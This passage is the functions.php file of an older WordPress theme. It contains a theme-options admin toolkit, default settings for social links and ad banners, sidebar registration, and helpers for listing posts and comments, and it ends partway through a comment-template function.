<?php
if (!function_exists('wordPressThemeOptions')) {
	function wordPressThemeOptions($theme='',$array='',$file='') {
		global ${$theme};
		if ($theme == '' or $array == '' or $file == '') {
			die ('No theme name, theme option, or parent defined in Toolkit');
		}
		${$theme} = new WordPressThemeOptions($theme,$array,$file);
	}
}

if (!class_exists('WordPressThemeOptions')) {
	class WordPressThemeOptions{
		var $option, $infos;

		function WordPressThemeOptions($theme,$array,$file){
			global $wp_version;
			if ( $wp_version >= 2 and count(@preg_grep('#^\.\./themes/[^/]+/functions.php$#', get_settings('active_plugins'))) > 0 ) {
				wp_cache_flush();
				$this->upgradeWordPressThemeOptions();
			}

			$this->infos['path'] = '../themes/' . basename(dirname($file));
			if ($array['debug']) {
				if ((basename($file)) == $_GET['page']) $this->infos['debug'] = 1;
				unset($array['debug']);
			}
			if ((basename($file)) == $_GET['page']){
				$this->infos['menu_options'] = $array;
				$this->infos['classname'] = $theme;
			}
			$this->option=array();
			$this->pluginification();
			$this->doInit();
			$this->readOptions();
			$this->file = $file;
			add_action('admin_menu', array(&$this, 'addMenu'));
		}
		function addMenu() {
			global $wp_version;
			if ( $wp_version >= 2 ) {
				$level = 'edit_themes';
			} else {
				$level = 9;
			}
			add_theme_page('Configure ' . $this->infos['theme_name'], $this->infos['theme_name'] . ' Options', 'edit_themes', basename($this->file), array(&$this,'adminMenu'));
		}

		function doInit() {
			$themes = get_themes();
			$shouldbe= basename($this->infos['path']);
			foreach ($themes as $theme) {
				$current= basename($theme['Template Dir']);
				if ($current == $shouldbe) {
					if (get_settings('template') == $current) {
						$this->infos['active'] = TRUE;
					} else {
						$this->infos['active'] = FALSE;
					}
				$this->infos['theme_name'] = $theme['Name'];
				$this->infos['theme_shortname'] = $current;
				$this->infos['theme_site'] = $theme['Title'];
				$this->infos['theme_version'] = $theme['Version'];
				$this->infos['theme_author'] = preg_replace("#>\s*([^<]*)</a>#", ">\\1</a>", $theme['Author']);
				}
			}
		}
		function readOptions() {
			$options = get_option('theme-'.$this->infos['theme_shortname'].'-options');
			$options['_________junk-entry________'] = 'ozh is my god';
			foreach ($options as $key=>$val) {
				$this->option["$key"] = stripslashes($val);
			}
			array_pop($this->option);
			return $this->option;
		}
		function storeOptions($array) {
			update_option('theme-'.$this->infos['theme_shortname'].'-options','');
			if (update_option('theme-'.$this->infos['theme_shortname'].'-options',$array)) {
				return "Options successfully stored";
			} else {
				return "Could not save options !";
			}
		}
		function deleteOptions() {
			delete_option('theme-'.$this->infos['theme_shortname'].'-options');
			$this->depluginification();
			if ($this->infos['active']) {
				update_option('template', 'default');
				update_option('stylesheet', 'default');
				do_action('switch_theme', 'Default');
			}
			print '<meta http-equiv="refresh" content="0;URL=themes.php?activated=true">';
			echo "<script> self.location(\"themes.php?activated=true\");</script>";
			exit;
		}
		function isInstalled() {
			global $wpdb;
			$where = 'theme-'.$this->infos['theme_shortname'].'-options';
			$check = $wpdb->get_var("SELECT COUNT(*) FROM $wpdb->options WHERE option_name = '$where'");
			if ($check == 0) {
				return FALSE;
			} else {
				return TRUE;
			}
		}
		function doFirstinit() {
			global $wpdb;
			$options = array();
			foreach(array_keys($this->option) as $key) {
				$options["$key"]='';
			}
			add_option('theme-'.$this->infos['theme_shortname'].'-options',$options, 'Options for theme '.$this->infos['theme_name']);
			return "Theme options added in database (1 entry in table '". $wpdb->options ."')";
		}
		function adminMenu () {
			global $cache_settings, $wpdb;
			if (@$_POST['action'] == 'store_option') {
				unset($_POST['action']);
				$msg = $this->storeOptions($_POST);
			} elseif (@$_POST['action'] == 'deleteOptions') {
				$this->deleteOptions();
			} elseif (!$this->isInstalled()) {
				$msg = $this->doFirstinit();
			}

			if (@$msg) print "<div class='updated'><p><b>" . $msg . "</b></p></div>\n";
			$cache_settings = '';
			$check = $this->readOptions();
			echo '<div class="wrap">';
			echo '<div id="icon-themes" class="icon32"><br/></div><h2>Configure ',$this->infos['theme_name'],' Theme</h2>';
			if (!$this->infos['active']) { /* theme is not active */
				echo '<p>(Please note that this theme is currently <strong>not activated</strong> on your site as the default theme.)</p>';
			}
			echo '
			<form action="" method="post">
			<input type="hidden" name="action" value="store_option">
			<table class="form-table"><tbody>';
			foreach ($this->infos['menu_options'] as $key=>$val) {
				$items='';
				preg_match('/\s*([^{#]*)\s*({([^}]*)})*\s*([#]*\s*(.*))/', $val, $matches);
				if ($matches[3]) {
					$items = split("\|", $matches[3]);
				}
				if (@$items) {
					$type = array_shift($items);
					switch ($type) {
					case 'separator':
						echo '<tr valign="top"><th scope="row" colspan="2"><label for="',$key,'"><h3>',$matches[1],'</h3></label></th>';
						if ($matches[5]) 
							echo '<br /><span class="description">'.$matches[5].'</span>';
						echo "
						</tr>\n";
						break;
					case 'textarea':
						$rows=array_shift($items);
						$cols=array_shift($items);
						echo '<tr valign="top"><th scope="row"><label for="',$key,'">',$matches[1],'</label></th>',"\n",'<td>';
						echo '<textarea name="',$key,'" id="',$key,'" rows="',$rows,'" cols="',$cols,'">',$this->option[$key],'</textarea>';
						if ($matches[5]) 
							echo '<br /><span class="description">'.$matches[5].'</span>';
						echo "
							</td>
						</tr>\n";
						break;
					case 'radio':
						echo '<tr valign="top"><th scope="row"><label for="',$key,'">',$matches[1],'</label></th>',"\n",'<td>';
						while ($items) {
							$v=array_shift($items);
							$t=array_shift($items);
							$checked='';
							if ($v == $this->option[$key]) $checked='checked="checked"';
							echo '<label for="',$key,$v,'"><input type="radio" id="',$key,$v,'" name="',$key,'" value="',$v,'" ',$checked,' /> ',$t,'</label>';
							if (@$items) echo '<br />',"\n";
						}
						if ($matches[5]) 
							echo '<br /><span class="description">'.$matches[5].'</span>';
						echo "
							</td>
						</tr>\n";
						break;
					
					case 'checkbox':
						echo '<tr valign="top"><th scope="row"><label for="',$key,'">',$matches[1],'</label></th>',"\n",'<td>';
						while ($items) {
							$k=array_shift($items);
							$v=array_shift($items);
							$t=array_shift($items);
							$checked='';
							if ($v == $this->option[$k]) $checked='checked="checked"';
							echo '<label for="',$k,$v,'"><input type="checkbox" id="',$k,$v,'" name="',$k,'" value="',$v,'" ',$checked,' /> ',$t,'</label>';
							if (@$items) echo '<br />',"\n";
						}
						if ($matches[5]) 
							echo '<br /><span class="description">'.$matches[5].'</span>';
						echo "
							</td>
						</tr>\n";
						break;
					case 'select':
						echo '<tr valign="top"><th scope="row"><label for="',$key,'">',$matches[1],'</label></th>',"\n",'<td><select name="',$key,'" id="',$key,'">';
						while ($items) {
							$v=array_shift($items);
							$t=array_shift($items);
							$selected='';
							if ($v == $this->option[$key]) $selected='selected="selected"';
							echo '<option value="',$v,'" ',$selected,'>',$t,'</option>';
						}
						if (@$items) echo "<br />\n";
						echo '</select>';
						if ($matches[5]) 
							echo '<br /><span class="description">'.$matches[5].'</span>';
						echo "
							</td>
						</tr>\n";
						break;
					}					
				} else {
					echo '
						<tr valign="top">
							<th scope="row">
								<label for="',$key,'">',$matches[1],'</label>
							</th>',"\n",'
							<td>
								<input type="text" name="',$key,'" id="',$key,'" value="',$this->option[$key],'" class="regular-text" />';	
						if ($matches[5]) 
							echo '<span class="description">'.$matches[5].'</span>';
						echo "
							</td>
						</tr>\n";					
				}
				
			}
			echo '</tbody>
			</table>
			<p class="submit"><input type="submit" value="Store Options" class="button-primary"/></p>
			</form>';

			if ($this->infos['debug'] and $this->option) {
				$g = '<span style="color:#006600">';
				$b = '<span style="color:#0000CC">';
				$o = '<span style="color:#FF9900">';
				$r = '<span style="color:#CC0000">';
				echo '<h2>Programmer\'s corner</h2>';
				echo '<p>The array <em>$'. $this->infos['classname'] . '->option</em> is actually populated with the following keys and values :</p>
				<p><pre class="updated">';
				$count = 0;
				foreach ($this->option as $key=>$val) {
					$val=str_replace('<','&lt;',$val);
					if ($val) {
						echo '<span class="ttkline">',$g,'$'.$this->infos['classname'],'</span>',$b,'-></span>',$g,'option</span>',$b,'[</span>',$g,'\'</span>',$r,$key,'</span>',$g,'\'</span>',$b,']</span>',$g,' = "</span>',$o,$val,'</span>',$g,"\"</span></span>\n";
						$count++;
					}
				}
				if (!$count) print "\n\n";
				echo '</pre><p>To disable this report (for example before packaging your theme and making it available for download), remove the line "&nbsp;<em>\'debug\' => \'debug\'</em>&nbsp;" in the array you edited at the beginning of this file.</p>';
			}

			echo '
			<form action="" method="post">
			<table class="form-table"><tbody>';
			
			echo '<tr valign="top"><th scope="row"><label><h3>Delete Theme options</h3></label></th></tr>';			
			echo '
			<tr valign="top"><th scope="row"><p>To completely remove these theme options from your database (reminder: they are all stored in a single entry, in Wordpress options table <em>'. $wpdb->options. '</em>), click on
			the following button.';
			
			echo '
						</th>
					</tr>
				</tbody>
			</table>
			
			<input type="hidden" name="action" value="deleteOptions">
			<p class="submit"><input type="submit" value="Delete Options" class="button-primary" onclick="return confirm(\'Are you really sure you want to delete ?\');"/></p>			
			</form>';

			ob_start(array(&$this,'footercut'));
			
			echo '<h3>Thank you !</h3>';
			echo '<p>Thank you for installing ' . $this->infos['theme_site'] . ', a theme for Wordpress. This theme has been created by '.$this->infos['theme_author'].'. 
				
<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
<input type="hidden" name="cmd" value="_s-xclick">
<input type="hidden" name="encrypted" value="-----BEGIN PKCS7-----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-----END PKCS7-----
">
<input type="image" src="https://www.paypal.com/en_US/i/btn/btn_donateCC_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
<img alt="" border="0" src="https://www.paypal.com/en_US/i/scr/pixel.gif" width="1" height="1">
</form>
				</p>';
			echo '</div>';			
		}

		function footercut($string) {
			return preg_replace('#</div><!-- footercut -->.*<div id="footer">#m', '', $string);
		}

		function pluginification () {
			global $wp_version;
			if ($wp_version<2) {
				$us = $this->infos['path'].'/functions.php';
				$them = get_settings('active_plugins');
				if (!in_array($us,$them)) {
					$them[]=$us;
					update_option('active_plugins',$them); 
					return TRUE; 
				} else {
					return FALSE; 
				}
			}
		}
		function depluginification () {
			global $wp_version;
			if ($wp_version<2) {
				$us = $this->infos['path'].'/functions.php';
				$them = get_settings('active_plugins');
				if (in_array($us,$them)) {
					$here = array_search($us,$them);
					unset($them[$here]);
					update_option('active_plugins',$them);
					return TRUE;
				} else {
					return FALSE;
				}
			}
		}

		function upgradeWordPressThemeOptions () {
			$plugins=get_settings('active_plugins');
			$delete=@preg_grep('#^\.\./themes/[^/]+/functions.php$#', $plugins);
			$result=array_diff($plugins,$delete);
			$temp = array();
			foreach($result as $item) $temp[]=$item;
			$result = $temp;
			update_option('active_plugins',$result);
			wp_cache_flush;
		}
	}
}

wordPressThemeOptions(
	'wordPressThemeOptions',
	array(
	'separator1' => 'Main {separator}',
	'logo' => 'Blog Logo ## Your Blog Logo.  <br />Example: http://www.blabla.com/your-link-images.jpg',
	'feedBurnerID' => 'Feedburner ID ## Your feedburner ID',	
	'featuredNumber' => 'Number of featured post ## Your Number of featured.',
	'recentPostNumber' => 'Number of recent post {select|3|3 Post|5|5 Post|7|7 Post|9|9 Post|11|11 Post|13|13 Post|15|15 Post|17|17 Post|19|19 Post|21|21 Post} ## Select the number of recent posts to display.',
	'popularPostNumber' => 'Number of popular post {select|3|3 Post|5|5 Post|7|7 Post|9|9 Post|11|11 Post|13|13 Post|15|15 Post|17|17 Post|19|19 Post|21|21 Post} ## Select the number of popular posts to display.',
	'relatedPostNumber' => 'Number of similiar post {select|3|3 Post|5|5 Post|7|7 Post|9|9 Post|11|11 Post|13|13 Post|15|15 Post|17|17 Post|19|19 Post|21|21 Post} ## Select the number of similiar posts to display.',
	'recentCommentNumber' => 'Number of recent comment {select|3|3 Comment|5|5 Comment|7|7 Comment|9|9 Comment|11|11 Comment|13|13 Comment|15|15 Comment|17|17 Comment|19|19 Comment|21|21 Comment} ## Select the number of recent Comment to display.',	
	
	'separator5' => 'Subsribe {separator}',
	
	'showRSSFeed' => 'Show RSS Feed? {checkbox|showRSSFeed|yes|Show} ## Check this box if you want to show RSS Feed in the sidebar and footer.',
	
	
	'showRSSCommentFeed' => 'Show RSS Comment Feed? {checkbox|showRSSCommentFeed|yes|Show} ## Check this box if you want to show RSS Comment Feed in the sidebar and footer.',
	
	
	'showTwitterFollow' => 'Show Twitter Follow? {checkbox|showTwitterFollow|yes|Show} ## Check this box if you want to show Twitter Follow Button in the sidebar and footer.',
	'twitterFollowLink' => 'Twitter Follow Link: ##  Insert link for the Feed Comment link',
	
	'showFacebookConnect' => 'Show Facebook Connect? {checkbox|showFacebookConnect|yes|Show} ## Check this box if you want to show Facebook Connect Button in the sidebar and footer.',
	'facebookConnect' => 'Facebook Connect Link: ##  Insert link for the facebook connect link',
	
	'showLinkedin' => 'Show Linkedin? {checkbox|showLinkedin|yes|Show} ## Check this box if you want to show Linkedin Button in the sidebar and footer.',
	'linkedin' => 'Linkedin Link: ##  Insert link for the Linkedin link',
	
	'showFlickr' => 'Show Flickr? {checkbox|showFlickr|yes|Show} ## Check this box if you want to show Flickr Button in the sidebar and footer.',
	'flickr' => 'Flickr Link: ##  Insert link for the Flickr link',
	
	'showYouTube' => 'Show Youtube? {checkbox|showYouTube|yes|Show} ## Check this box if you want to show YouTube Button in the sidebar and footer.',
	'youTube' => 'YouTube Link: ##  Insert link for the YouTube link',
	
	'separator2' => 'Advertisment {separator}',
	'showAdBox' => 'Show Adv box? {checkbox|showAdBox|yes|Show} ## Check this box if you want to show Ad box in the sidebar.',
	'advertisment1Image' => 'Advertisment 1 Image: ##  Insert here the image path for the banner (125x125 pixels)',
	'advertisment1Link' => 'Advertisment 1 Link: ## Insert here the link for the banner',
	
	'advertisment2Image' => 'Advertisment 2 Image: ##  Insert here the image path for the banner (125x125 pixels)',
	'advertisment2Link' => 'Advertisment 2 Link: ## Insert here the link for the banner',
	
	'advertisment3Image' => 'Advertisment 3 Image: ##  Insert here the image path for the banner (125x125 pixels)',
	'advertisment3Link' => 'Advertisment 3 Link: ## Insert here the link for the banner',
	
	'advertisment4Image' => 'Advertisment 4 Image: ##  Insert here the image path for the banner (125x125 pixels)',
	'advertisment4Link' => 'Advertisment 4 Link: ## Insert here the link for the banner',
	
	'separator3' => 'Contact info {separator}',
	'contactInfo' => 'Contact info {textarea|6|50} ## This will display in footer contact info',
	
	'separator4' => 'About {separator}',
	'aboutImage' => 'Image Link ## This images will display in footer about. <br />Example: http://www.blabla.com/your-link-images.jpg',
	'aboutDescription' => 'Desctription {textarea|6|50} ## This desctription will display in footer about'
	),
	TEMPLATEPATH.'/functions.php'
);

if (!$wordPressThemeOptions->isInstalled()) {
	$set_defaults['logo'] = trailingslashit( get_bloginfo('template_url') ).'images/logo.png';
	$set_defaults['featuredNumber'] = '14';
	$set_defaults['popularPostNumber'] = '7';
	$set_defaults['relatedPostNumber'] = '7';
	$set_defaults['recentCommentNumber'] = '3';
	
	$set_defaults['showRSSFeed'] = 'yes';
	$set_defaults['showRSSCommentFeed'] = 'yes';
	$set_defaults['showTwitterFollow'] = 'yes';
	$set_defaults['twitterFollowLink'] = 'http://twitter.com/#';
	$set_defaults['showFacebookConnect'] = 'yes';
	$set_defaults['facebookConnect'] = 'http://facebook.com/#';
	$set_defaults['showLinkedin'] = 'yes';
	$set_defaults['linkedin'] = 'http://linkedin.com/#';
	$set_defaults['showFlickr'] = 'yes';
	$set_defaults['flickr'] = 'http://flickr.com/photos/#';
	$set_defaults['showYouTube'] = 'yes';
	$set_defaults['youTube'] = 'http://flickr.com/user/#';
	
	
	
	$set_defaults['showAdBox'] = 'yes';
	$set_defaults['advertisment1Image'] = trailingslashit( get_bloginfo('template_url') ).'images/brownmali.gif';
	$set_defaults['advertisment1Link'] = '#';
	$set_defaults['advertisment2Image'] = trailingslashit( get_bloginfo('template_url') ).'images/brownmali.gif';
	$set_defaults['advertisment2Link'] = '#';
	$set_defaults['advertisment3Image'] = trailingslashit( get_bloginfo('template_url') ).'images/brownmali.gif';
	$set_defaults['advertisment3Link'] = '#';
	$set_defaults['advertisment4Image'] = trailingslashit( get_bloginfo('template_url') ).'images/brownmali.gif';
	$set_defaults['advertisment4Link'] = '#';
	
	
	$set_defaults['contactInfo'] = '
	<p>
		<strong>Phone: </strong>+1234567<br/>
		<strong>Fax: </strong>+123456789
	</p>

	<p><strong>Address: </strong>123 Put Your Address Here</p>
    <p><strong>E-mail: </strong>me@fauzy.info</p>
	<p>Want more info - go to our <a href="#">contact page</a></p>';	
	$set_defaults['aboutImage'] = trailingslashit( get_bloginfo('template_url') ).'/images/gravatar.jpg';
	$set_defaults['aboutDescription'] = 'Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec libero. Suspendisse bibendum. Cras id urna. Morbi tincidunt, orci ac convallis aliquam, lectus turpis varius lorem, eu posuere nunc justo tempus leo. Donec mattis, purus nec placerat bibendum, dui pede condimentum odio, ac blandit ante orci ut diam.<p>
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec libero. Suspendisse bibendum. Cras id urna.</p>';	
	
	$result = $wordPressThemeOptions->storeOptions($set_defaults);
}

if( function_exists('register_sidebar') ) {
	register_sidebar(array(
		'name' => 'east_sidebar',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>'
	));
	register_sidebar(array(
		'name' => 'footer_sidebar',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>'
	));
}

if (!function_exists('wpFeaturedPost')) {
	function wpFeaturedPost($numberPosts=7) {		
		global $wpdb;
		$myposts = $wpdb->get_results("SELECT $wpdb->posts.post_title, $wpdb->posts.post_date, $wpdb->posts.ID, $wpdb->posts.post_content FROM $wpdb->posts WHERE $wpdb->posts.post_status = 'publish' AND $wpdb->posts.post_type = 'post' ORDER BY $wpdb->posts.post_modified DESC", OBJECT);
		
		$i=0;
		foreach($myposts as $post) {
			if ($i == $numberPosts) break;
			else {
				$sTitle='';
				$sTitle=getStringLimit($post->post_title,20);
				echo ('
				<a href="'.get_permalink($post->ID).'" rel="image">
					<img src="'.getPostThumbnail($post->ID).'" title="'.$sTitle.'" alt="'.$sTitle.'" />
				</a>');
				$i++;
			}
		}			
	}
}
if (!function_exists('getPostThumbnail')) {
	function getPostThumbnail($postId, $smart=true){
	  $imageLink = null;
	  $imageLink = get_post_meta($postId, "thumbnail", true);
	  
	  if($smart==true) {
	  	if ( $imageLink == '' ) $imageLink = catchImage(get_post($postId));
	  } else if ($smart==false) {
		 $imageLink ='';
	}
	  
	  return $imageLink;
	}
}
if (!function_exists('catchImage')) {
	function catchImage($pPost=null) {
	  $first_img = '';
	
	  if (empty($pPost)) {
		global $post, $posts;
		ob_start();
		ob_end_clean();
		$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
		$first_img = $matches [1][0];
	  } else {
		$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $pPost->post_content, $matches);
		$first_img = $matches [1][0];
		}
	
	  if(empty($first_img)){
		$first_img = trailingslashit( get_bloginfo('template_url') ).'/images/logo.png';
	  }
	  return $first_img;
	}
}

if (!function_exists('wpListRecentPost')) {
	function wpListRecentPost($numberPosts=7) {
		$recent_posts = wp_get_recent_posts($numberPosts);
		foreach($recent_posts as $post){
			echo ('<li><a href="'.get_permalink($post["ID"]).'" rel="bookmark" title="Permanent Link to '.$post["post_title"].'">');
			echo ('<img src="'.getPostThumbnail($post["ID"], true).'" alt="'.$post["post_title"].'" style="max-height:40px;max-width:40px" />');
			echo ('<span>'.$post["post_title"].'</span></a><div class="clear">&nbsp;</div></li>');
		}
	}
}


if (!function_exists('get_time_link')) {
	function get_time_link() {
		echo ('<a href="');
		bloginfo('url');
		echo('?m=');
		
		the_time(__('Ymd'));
		echo('">');
		the_time(__('F jS, Y'));
		echo('</a>');
	}
}

if (!function_exists('wpListPopularPosts')) {
	function wpListPopularPosts($numberPosts=7) {
		global $wpdb;
		$myposts = $wpdb->get_results("SELECT $wpdb->posts.post_title, $wpdb->posts.post_content, $wpdb->posts.post_date, $wpdb->posts.ID FROM $wpdb->posts WHERE $wpdb->posts.post_status = 'publish' AND $wpdb->posts.post_type = 'post' ORDER BY $wpdb->posts.comment_count DESC LIMIT ".$numberPosts, OBJECT);
		$i=0;
		foreach($myposts as $post) {
			$i++;
			$sTitle='';
			$sTitle=getStringLimit($post->post_title,20);
		
			echo ('
				<li>
                	<a href="'.get_permalink($post->ID).'" rel="bookmark" title="Permanent Link to '.$sTitle.'">');
			echo ('
                		<img src="'.getPostThumbnail($post->ID, true).'" rel="bookmark" title="Permanent Link to '.$sTitle.'" alt="'.$sTitle.'" style="max-height:40px;max-width:40px" class="alignleft" />');
						echo('
                    	'.$sTitle.'
                    </a><br />
					'.getStringLimit($post->post_content,40).'
					<div class="fix"></div>
                    <span>Posted on ');
					echo($post->post_date);
					echo('
					</span>
				</li>
			');
		}
	}
}
if (!function_exists('getStringLimit')) {
	function getStringLimit($output, $max_char) {
		$output = str_replace(']]>', ']]&gt;', str_replace('[...]', '', stripslashes($output)));
		$output = preg_replace( '|\[(.+?)\](.+?\[/\\1\])?|s', '', strip_tags($output));
		if ((strlen($output)>$max_char) && ($espacio = strpos($output, " ", $max_char ))) {
			$output = substr($output, 0, $espacio).'...';
			return $output;
		} else {
			return $output;
		}
	}
}

if (!function_exists('wpListRecentComments')) {
	function wpListRecentComments($numberposts=7) {
		global $wpdb, $post;
		$recentcomments = $wpdb->get_results("SELECT $wpdb->comments.comment_ID, $wpdb->comments.comment_post_ID, $wpdb->comments.comment_author, $wpdb->comments.comment_content, $wpdb->comments.comment_author_email FROM $wpdb->comments WHERE $wpdb->comments.comment_approved=1 ORDER BY $wpdb->comments.comment_date DESC LIMIT ".$numberposts, OBJECT);
		foreach ($recentcomments as $rc) {
			$post = get_post($rc->comment_post_ID);
			$Img = "http://www.gravatar.com/avatar.php?gravatar_id=" . md5($rc->comment_author_email) . "&default=" . urlencode($default) . "&size=40";
			
			echo('
			<li>
            	<a href="'.get_permalink($post->ID).'#comment-'.$rc->comment_ID.'" rel="bookmark" title="Permanent Link to '.the_title_attribute('echo=0').'">');
				echo('
                	<img src="'.$Img.'" alt="'.the_title_attribute('echo=0').'" style="max-height:40px;max-width:40px" class="alignleft" />');
					echo(substr(strip_tags(str_replace('[...]', '...', $rc->comment_content)), 0, 75));
					echo('
                </a><br /> &#45;');
				echo('
                <cite>'.$rc->comment_author.'</cite>
			</li>
			<div class="fix"></div>
			');
		}
	}
}

if (!function_exists('wpListRelatedPost')) {
	function wpListRelatedPost($numberposts=7) {
		$orig_post = $post;
		global $post;
		$categories = get_the_category($post->ID);
		if ($categories) {
			$category_ids = array();
			foreach($categories as $individual_category) $category_ids[] = $individual_category->term_id;
			
			$args=array(
			'category__in' => $category_ids,
			'post__not_in' => array($post->ID),
			'posts_per_page'=> 2,
			'caller_get_posts'=>1
			);
			
			$my_query = new wp_query( $args );
			if( $my_query->have_posts() ) {
				while( $my_query->have_posts() ) {
					$my_query->the_post();
					
					
					
					echo ('
					<li>
						<a href="'.get_permalink($post->ID).'" rel="bookmark" title="Permanent Link to '.$post->post_title.'">');
					echo ('
						<img src="'.getPostThumbnail($post->ID, true).'" alt="'.$post->post_title.'" style="max-height:40px;max-width:40px" class="alignleft"/>');
					echo (
						$post->post_title.'
						</a><br />                    
						'.getStringLimit($post->post_content,200).'
						<div class="fix"></div>
						<span>Posted on '.$post->post_date.'</span>
					</li>
					');
				}
			}
		}
		$post = $orig_post;
		wp_reset_query(); 
	}
}


/** Comments */
if (function_exists('wp_list_comments')) {
	// comment count
	function comment_count( $commentcount ) {
		global $id;
		$_comments = get_comments('status=approve&post_id=' . $id);
		$comments_by_type = &separate_comments($_comments);
		return count($comments_by_type['comment']);
	}
}

// custom comments
function custom_comments($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment;
	global $commentcount;
	if(!$commentcount) {
		$commentcount = 0;
	}
?>
	<li class="comment <?php if($comment->comment_author_email == get_the_author_email()) {echo 'admincomment';} else {echo 'regularcomment';} ?>" id="comment-<?php comment_ID() ?>">
		<div class="author">
			<div class="pic">
				<?php if (function_exists('get_avatar') && get_option('show_avatars')) { echo get_avatar($comment, 32); } ?>
			</div>

		</div>

		<div class="info corner10">
        	<div class="name">
				<?php if (get_comment_author_url()) : ?>
					<a id="commentauthor-<?php comment_ID() ?>" class="url" href="<?php comment_author_url() ?>" rel="external nofollow">
				<?php else : ?>
					<span id="commentauthor-<?php comment_ID() ?>">
				<?php endif; ?>

				<?php comment_author(); ?>

				<?php if(get_comment_author_url()) : ?>
					</a>
				<?php else : ?>
					</span>
				<?php endif; ?>
			</div>
			<div class="date">
				<?php printf( __('%1$s at %2$s', 'twellow'), get_comment_time(__('F jS, Y', 'twellow')), get_comment_time(__('H:i', 'twellow')) ); ?>
					 | <a href="#comment-<?php comment_ID() ?>"><?php printf('#%1$s', ++$commentcount); ?></a>
			</div>
			<div class="act">
